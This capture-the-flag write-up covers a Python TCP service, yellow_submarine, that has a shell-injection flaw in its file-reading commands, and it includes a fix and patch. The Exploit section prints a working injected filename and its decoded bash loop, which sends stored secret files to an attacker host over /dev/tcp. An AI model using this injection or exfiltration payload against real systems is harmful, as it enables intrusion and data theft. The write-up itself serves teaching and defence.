# yellow_submarine

## Description

yellow_submarine is a simple text-based TCP service on port 10002 written in Python 2.

It provides a simple command shell and provides four commands:

1. `keygen`
2. `store`
3. `read`
4. `exit`

The connection stays open for 60 seconds and terminates after a timeout.

The service first requires to generate an RSA key pair. This is done via the `keygen` command, which requires solving a Proof of Work (PoW).

The generated key will be stored in a file named `signer_[UUID].key`, where `[UUID]` is a random UUID. This key will be used to sign output from the `store` function so that it cannot be forged.

After the `keygen` command, the `store` command be used. It reads a string that will become the filename and a string in base64 which will be stored encrypted with AES in file with the previously chosen filename with the prefix `data_`. The AES encryption key will be stored along with this file with the same name and the additional suffix `.key`. Finally, a token is printed, which includes the key ID from the `keygen` command, the **shell command (!)** to retrieve the contents of the encrypted file via the UNIX command `cat`, the RSA signature for this string, another **shell command (!)** to retrieve the contents of the according key file via cat and finally another RSA signature for the previous string.

The string from the `store` command can then be used with the `read` command to read the previously entered secret (in base64). This command reads in the parts of the token, takes the RSA key and verifies the signatures for the **shell commands (!)**

The game server regularly stores flags via these commands.


### Proof of Work (PoW)

The PoW consists of a challenge and a prefix. The first four characters of the SHA256 hash of the prefix together with an unknown value need to match the value of the challenge.

See the function `pow()` in the exploit code for a possible solution.


### Demo

![Normal usage of yellow_submarine service in a shell via netcat](/2020.03%20UCSB%20iCTF/yellow_submarine/yellow_submarine.gif)


### Code

For the source code of the service see [main.py](/2020.03%20UCSB%20iCTF/yellow_submarine/main.py).


## Exploit

The bold written words in the description (**shell commands (!)**) were a slight hint for the possible exploitation of this service.

The problem is that instead of reading the file contents via `file.read()`, a UNIX shell command (`cat`) is called via `os.popen()`. This is not really a problem, but it becomes an issue where the user input (the filename) is combined with this command without proper escaping/sanitization. This enables remote code execution (RCE) by providing a specifically crafted filename in the `store` command of the service. This command will then be executed when the token is used in with the `read` command.

The following exploit provides a simple TCP server on a random port that acts as the target for the files which will be sent by the injected shell command. The string for a filename with an exploit basically looks like this:

```
58629;echo Zm9yIGYgaW4gJChscyAtMSB8IGdyZXAgLUUgJ15kYXRhX1thLXowLTktXXszNn0oXC5rZXkpPyQnKTsgZG8gZWNobyAiJGYiID4mIC9kZXYvdGNwLzE5Mi4xNjguMC4yLzUzMzExIDA+JjE7IGNhdCAiJGYiID4mIC9kZXYvdGNwLzE5Mi4xNjguMC4yLzUzMzExIDA+JjE7IGRvbmU=|base64 -d|bash
```

The first number is a random number to make sure that the file does not exist (probably not needed, but does not hurt). The rest of the command is converted to base64 and converted back to prevent problems with slashes as these will be interpreted as a path (actually base32 would probably be smarter for that).

The base64 encoded string looks like this:

```
for f in $(ls -1 | grep -E '^data_[a-z0-9-]{36}(\.key)?$'); do echo "$f" >& /dev/tcp/192.168.0.2/53311 0>&1; cat "$f" >& /dev/tcp/192.168.0.2/53311 0>&1; done
```

It searches for files (secrets and their keys) that match a certain pattern (the game server apparently chooses this pattern for filenames) and redirects its contents to a TCP socket (bash feature) for the server created by the exploit. The filename is also included so they can be assembled properly (maybe using `tar` would be smarter).

The rest of the exploit reads the received files and tries to decrypt them. If the output matches the flag pattern, it is returned on stdout.


### Code

Requirements:

- Python 3 (tested with 3.7.6)
- [PyCryptodome](https://www.pycryptodome.org/) (`pip3 install pycryptodome`)

See [exploit.py](/2020.03%20UCSB%20iCTF/yellow_submarine/exploit.py).

Note: The target for the reverse shell (`REVERSE_SHELL_TARGET`) needs to be the hostname/IP of the host running the exploit.


## Fix

Escape shell command in `read` command, e.g. via [`pipes.quote()`](https://docs.python.org/2/library/pipes.html). Note: The service is written in Python 2, therefore the `shlex` library is not available.

### Patch

```diff
--- main.py.bak 2020-03-06 21:58:02.529359486 +0000
+++ main.py     2020-03-06 21:58:20.985470271 +0000
@@ -9,6 +9,7 @@
 import os
 import random
 import hashlib
+import pipes
 
 banner = '''
  __ __     _ _              _____     _                 _         
@@ -90,10 +91,10 @@
         key_id, cmd_f, cmd_kf, sig_f, sig_kf = token.split('|')
         with open('signer_%s.key' % key_id) as f: key = RSA.importKey(f.read())
         if not verify(key, cmd_f, sig_f) or not verify(key, cmd_kf, sig_kf): raise Exception('Invalid signature')
-        cmd_f = base64.b64decode(cmd_f)
-        cmd_kf = base64.b64decode(cmd_kf)
-        with os.popen(cmd_f) as f: ciphertext = f.read()
-        with os.popen(cmd_kf) as f: data_key = f.read()
+        cmd_f = base64.b64decode(cmd_f).split(' ', 1)
+        cmd_kf = base64.b64decode(cmd_kf).split(' ', 1)
+        with os.popen('cat ' + pipes.quote(cmd_f[1])) as f: ciphertext = f.read()
+        with os.popen('cat ' + pipes.quote(cmd_kf[1])) as f: data_key = f.read()
         cipher = AES.new(data_key, AES.MODE_CBC, '\x00' * 16)
         plaintext = cipher.decrypt(ciphertext)
         print('Hey. This is your secret:')
```
